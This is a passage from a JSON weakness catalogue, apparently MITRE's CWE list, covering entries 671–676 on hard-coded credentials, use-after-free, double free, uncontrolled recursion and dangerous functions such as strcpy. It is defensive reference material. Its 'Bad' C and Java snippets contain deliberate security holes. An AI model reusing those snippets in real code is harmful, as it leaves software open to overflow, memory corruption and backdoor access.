          ]
        },
        {
          "ID": "DX-182",
          "Entries": [
            {
              "IntroText": "In both of these examples, a message is printed based on the month passed into the function:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: print(\"January\");\n\t\t\t\t\tcase 2: print(\"February\");\n\t\t\t\t\tcase 3: print(\"March\");\n\t\t\t\t\tcase 4: print(\"April\");\n\t\t\t\t\tcase 5: print(\"May\");\n\t\t\t\t\tcase 6: print(\"June\");\n\t\t\t\t\tcase 7: print(\"July\");\n\t\t\t\t\tcase 8: print(\"August\");\n\t\t\t\t\tcase 9: print(\"September\");\n\t\t\t\t\tcase 10: print(\"October\");\n\t\t\t\t\tcase 11: print(\"November\");\n\t\t\t\t\tcase 12: print(\"December\");\n\t\t\t}\n\t\t\tprintln(\" is a great month\");\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: printf(\"January\");\n\t\t\t\t\tcase 2: printf(\"February\");\n\t\t\t\t\tcase 3: printf(\"March\");\n\t\t\t\t\tcase 4: printf(\"April\");\n\t\t\t\t\tcase 5: printff(\"May\");\n\t\t\t\t\tcase 6: printf(\"June\");\n\t\t\t\t\tcase 7: printf(\"July\");\n\t\t\t\t\tcase 8: printf(\"August\");\n\t\t\t\t\tcase 9: printf(\"September\");\n\t\t\t\t\tcase 10: printf(\"October\");\n\t\t\t\t\tcase 11: printf(\"November\");\n\t\t\t\t\tcase 12: printf(\"December\");\n\t\t\t}\n\t\t\tprintf(\" is a great month\");\n\t}\n```"
            },
            {
              "BodyText": "Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling \"printMessage(10)\" will result in the text \"OctoberNovemberDecember is a great month\" being printed."
            }
          ]
        },
        {
          "ID": "DX-183",
          "Entries": [
            {
              "IntroText": "In the excerpt below, an AssertionError (an unchecked exception) is thrown if the user hasn't entered an email address in an HTML form."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString email = request.getParameter(\"email_address\");\n\tassert email != null;\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-3011",
          "Description": "virtual interrupt controller in a virtualization product allows crash of host by writing a certain invalid value to a register, which triggers a fatal error instead of returning an error code",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3011"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This node could possibly be split into lower-level nodes. \"Early Return\" is for returning control to the caller too soon (e.g., CWE-584). \"Excess Return\" is when control is returned too far up the call stack (CWE-600, CWE-395). \"Improper control limitation\" occurs when the product maintains control at a lower level of execution, when control should be returned \"further\" up the call stack (CWE-455). \"Incorrect syntax\" covers code that's \"just plain wrong\" such as CWE-484 and CWE-483."
        }
      ]
    },
    {
      "ID": "671",
      "Name": "Lack of Administrator Control over Security",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.",
      "ExtendedDescription": "If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-14",
          "Entries": [
            {
              "IntroText": "The following code is an example of an internal hard-coded password in the back-end:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint VerifyAdmin(char *password) {\n\t\t\tif (strcmp(password, \"Mew!\")) {\n\t\t\t\t\t printf(\"Incorrect Password!\\n\");\n\t\t\t\t\treturn(0)\n\t\t\t}\n\t\t\tprintf(\"Entering Diagnostic Mode...\\n\");\n\t\t\treturn(1);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tint VerifyAdmin(String password) {\n\t\tif (!password.equals(\"Mew!\")) {\n\t\t\treturn(0)\n\t\t}\n\t\t//Diagnostic Mode\n\t\treturn(1);\n\t}\n```"
            },
            {
              "BodyText": "Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\""
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-29953",
          "Description": "Condition Monitor firmware has a maintenance interface with hard-coded credentials",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-29953"
        },
        {
          "Reference": "CVE-2000-0127",
          "Description": "GUI configuration tool does not enable a security option when a checkbox is selected, although that option is honored when manually set in the configuration file.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0127"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "672",
      "Name": "Operation on a Resource after Expiration or Release",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "666",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Application Data",
            "Read Application Data"
          ],
          "Note": "If a released resource is subsequently reused or reallocated, then an attempt to use the original resource might allow access to sensitive data that is associated with a different user or entity."
        },
        {
          "Scope": [
            "Other",
            "Availability"
          ],
          "Impact": [
            "Other",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "When a resource is released it might not be in an expected state, later attempts to access the resource may lead to resultant errors that may lead to a crash."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-71",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a use after free error:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\tif (err) {\n\t\tabrt = 1;\n\t\tfree(ptr);\n\t}\n\t...\n\tif (abrt) {\n\t\tlogError(\"operation aborted before commit\", ptr);\n\t}\n```"
            },
            {
              "BodyText": "When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function."
            }
          ]
        },
        {
          "ID": "DX-72",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a double free error:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\t...\n\tif (abrt) {\n\t\tfree(ptr);\n\t}\n\t...\n\tfree(ptr);\n```"
            },
            {
              "BodyText": "Double free vulnerabilities have two common (and sometimes overlapping) causes:"
            },
            {
              "BodyText": "- Error conditions and other exceptional circumstances\n\n  - Confusion over which part of the program is responsible for freeing the memory"
            },
            {
              "BodyText": "Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following C/C++ example the method processMessage is used to process a message received in the input array of char arrays. The input message array contains two char arrays: the first is the length of the message and the second is the body of the message. The length of the message is retrieved and used to allocate enough memory for a local char array, messageBody, to be created for the message body. The messageBody is processed in the method processMessageBody that will return an error if an error occurs while processing. If an error occurs then the return result variable is set to indicate an error and the messageBody char array memory is released using the method free and an error message is sent to the logError method."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define FAIL 0\n\t#define SUCCESS 1\n\t#define ERROR -1\n\t#define MAX_MESSAGE_SIZE 32\n\tint processMessage(char **message)\n\t{\n\t\t\tint result = SUCCESS;\n\t\t\tint length = getMessageLength(message[0]);\n\t\t\tchar *messageBody;\n\t\t\tif ((length > 0) && (length < MAX_MESSAGE_SIZE)) {\n\t\t\t\t\tmessageBody = (char*)malloc(length*sizeof(char));\n\t\t\t\t\tmessageBody = &message[1][0];\n\t\t\t\t\tint success = processMessageBody(messageBody);\n\t\t\t\t\tif (success == ERROR) {\n\t\t\t\t\t\tresult = ERROR;\n\t\t\t\t\t\tfree(messageBody);\n\t\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Unable to process message; invalid message length\");\n\t\t\t\tresult = FAIL;\n\t\t\t}\n\t\t\tif (result == ERROR) {\n\t\t\t\tlogError(\"Error processing message\", messageBody);\n\t\t\t}\n\t\t\treturn result;\n\t}\n```"
            },
            {
              "BodyText": "However, the call to the method logError includes the messageBody after the memory for messageBody has been released using the free method. This can cause unexpected results and may lead to system crashes. A variable should never be used after its memory resources have been released."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tmessageBody = (char*)malloc(length*sizeof(char));\n\tmessageBody = &message[1][0];\n\tint success = processMessageBody(messageBody);\n\tif (success == ERROR) {\n\t\tresult = ERROR;\n\t\tlogError(\"Error processing message\", messageBody);\n\t\tfree(messageBody);\n\t}\n\t...\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-3547",
          "Description": "Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3547"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP15",
          "EntryName": "Faulty Resource Use"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO46-C",
          "EntryName": "Do not access a closed file",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM30-C",
          "EntryName": "Do not access freed memory",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-672"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-672",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "673",
      "Name": "External Influence of Sphere Definition",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not prevent the definition of control spheres from external actors.",
      "ExtendedDescription": "Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a \"publisher;\" commenting on articles, only accessible to a \"commenter\" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In Untrusted Search Path (CWE-426), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product's intended sphere of control would include \"resources that are only modifiable by the person who installed the product.\" The PATH effectively changes the definition of this sphere so that it overlaps the attacker's sphere of control."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-2613",
          "Description": "setuid program allows compromise using path that finds and loads a malicious library.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2613"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Theoretical",
          "Note": "A \"control sphere\" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for \"administrators\" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be \"users who are authenticated to the operating system on which the product is installed.\" Each sphere has different sets of actors and allowable behaviors."
        }
      ]
    },
    {
      "ID": "674",
      "Name": "Uncontrolled Recursion",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly control the amount of recursion that takes place,  consuming excessive resources, such as allocated memory or the program stack.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "834",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Stack Exhaustion"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "The uncontrolled recursion is often due to an improper or missing conditional"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)",
            "DoS: Resource Consumption (Memory)"
          ],
          "Note": "Resources including CPU, memory, and stack memory could be rapidly consumed or exhausted, eventually leading to an exit or crash."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "In some cases, an application's interpreter might kill a process or thread that appears to be consuming too much resources, such as with PHP's memory_limit setting. When the interpreter kills the process/thread, it might report an error containing detailed information such as the application's installation path."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure an end condition will be reached under all logic conditions. The end condition may include testing against the depth of recursion and exiting with an error if the recursion goes too deep. The complexity of the end condition contributes to the effectiveness of this action.",
          "Effectiveness": "Moderate"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Increase the stack size.",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "Increasing the stack size might only be a temporary measure, since the stack typically is still not very large, and it might remain easy for attackers to cause an out-of-stack fault."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-204",
          "Entries": [
            {
              "IntroText": "In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here, but the value of flg is unmodified\n\t if (flg) { do_something_recursive (flg); } // flg is never modified so it is always TRUE - this call will continue until the stack explodes\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"
            },
            {
              "BodyText": "Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive call to return."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "void do_something_recursive (int flg)\n {\n\n```\n\t ... // Do some real work here\n\t // Modify value of flg on done condition\n\t if (flg) { do_something_recursive (flg); } // returns when flg changes to 0\n }\n int flag = 1; // Set to TRUE\n do_something_recursive (flag);\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-1285",
          "Description": "Deeply nested arrays trigger stack exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1285"
        },
        {
          "Reference": "CVE-2007-3409",
          "Description": "Self-referencing pointers create infinite loop and resultant stack exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3409"
        },
        {
          "Reference": "CVE-2016-10707",
          "Description": "Javascript application accidentally changes input in a way that prevents a recursive call from detecting an exit condition.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2016-10707"
        },
        {
          "Reference": "CVE-2016-3627",
          "Description": "An attempt to recover a corrupted XML file infinite recursion protection counter was not always incremented missing the exit condition.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2016-3627"
        },
        {
          "Reference": "CVE-2019-15118",
          "Description": "USB-audio driver's descriptor code parsing allows unlimited recursion leading to stack exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-15118"
        }
      ],
      "AffectedResources": [
        "CPU"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A9",
          "EntryName": "Denial of Service",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP13",
          "EntryName": "Unrestricted Consumption"
        },
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-CWE-674"
        }
      ],
      "RelatedAttackPatterns": [
        "230",
        "231"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-CWE-674",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "675",
      "Name": "Multiple Operations on Resource in Single-Operation Context",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product performs the same operation on a resource two or more times, when the operation should only be applied once.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "586",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "102",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-149",
          "Entries": [
            {
              "IntroText": "The following code shows a simple example of a double free vulnerability."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* ptr = (char*)malloc (SIZE);\n\t...\n\tif (abrt) {\n\t\tfree(ptr);\n\t}\n\t...\n\tfree(ptr);\n```"
            },
            {
              "BodyText": "Double free vulnerabilities have two common (and sometimes overlapping) causes:"
            },
            {
              "BodyText": "- Error conditions and other exceptional circumstances\n\n  - Confusion over which part of the program is responsible for freeing the memory"
            },
            {
              "BodyText": "Although some double free vulnerabilities are not much more complicated than this example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once."
            }
          ]
        },
        {
          "ID": "DX-184",
          "Entries": [
            {
              "IntroText": "This code binds a server socket to port 21, allowing the server to listen for traffic on that port."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid bind_socket(void) {\n\t\t\tint server_sockfd;\n\t\t\tint server_len;\n\t\t\tstruct sockaddr_in server_address;\n```\n/*unlink the socket if already bound to avoid an error when bind() is called*/* \n\t\t\t\n\t\t\tunlink(\"server_socket\");\n\t\t\tserver_sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\t\t\t\n\t\t\tserver_address.sin_family = AF_INET;\n\t\t\tserver_address.sin_port = 21;\n\t\t\tserver_address.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\t\tserver_len = sizeof(struct sockaddr_in);\n\t\t\t\n\t\t\tbind(server_sockfd, (struct sockaddr *) &s1, server_len);}"
            },
            {
              "BodyText": "This code may result in two servers binding a socket to same port, thus receiving each other's traffic. This could be used by an attacker to steal packets meant for another process, such as a secure FTP server."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-0935",
          "Description": "Attacker provides invalid address to a memory-reading function, causing a mutex to be unlocked twice",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0935"
        },
        {
          "Reference": "CVE-2019-13351",
          "Description": "file descriptor double close can cause the wrong file to be associated with a file descriptor.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-13351"
        },
        {
          "Reference": "CVE-2004-1939",
          "Description": "XSS protection mechanism attempts to remove \"/\" that could be used to close tags, but it can be bypassed using double encoded slashes (%252F)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1939"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is probably closely associated with other issues related to doubling, such as CWE-462 (duplicate key in alist) or CWE-102 (Struts duplicate validation forms). It's usually a case of an API contract violation (CWE-227)."
        }
      ]
    },
    {
      "ID": "676",
      "Name": "Use of Potentially Dangerous Function",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1177",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context",
            "Quality Degradation",
            "Unexpected State"
          ],
          "Note": "If the function is used incorrectly, then it could result in security problems."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode Quality Analysis\n\t\tBinary / Bytecode simple extractor - strings, ELF readers, etc.",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tDebugger\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWarning Flags\n\t\tSource Code Quality Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tOrigin Analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Build and Compilation",
            "Implementation"
          ],
          "Description": "Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the \"banned.h\" include file from Microsoft's SDL. [REF-554] [REF-7]"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-6",
          "Entries": [
            {
              "IntroText": "The following code attempts to create a local copy of a buffer to perform some manipulations to the data."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid manipulate_string(char * string){\n\t\tchar buf[24];\n\t\tstrcpy(buf, string);\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-1470",
          "Description": "Library has multiple buffer overflows using sprintf() and strcpy()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1470"
        },
        {
          "Reference": "CVE-2009-3849",
          "Description": "Buffer overflow using strcat()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3849"
        },
        {
          "Reference": "CVE-2006-2114",
          "Description": "Buffer overflow using strcpy()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2114"
        },
        {
          "Reference": "CVE-2006-0963",
          "Description": "Buffer overflow using strcpy()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-0963"
        },
        {
          "Reference": "CVE-2011-0712",
          "Description": "Vulnerable use of strcpy() changed to use safer strlcpy()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0712"
        },
        {
          "Reference": "CVE-2008-5005",
          "Description": "Buffer overflow using strcpy()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5005"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Dangerous Functions"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "CON33-C",
          "EntryName": "Avoid race conditions when using library functions",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ENV33-C",
          "EntryName": "Do not call system()",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR07-C",
          "EntryName": "Prefer functions that support error checking over equivalent functions that don't"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ERR34-C",
          "EntryName": "Detect errors when converting a string to a number",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "FIO01-C",
          "EntryName": "Be careful using functions that use file names for identification"
        },
        {
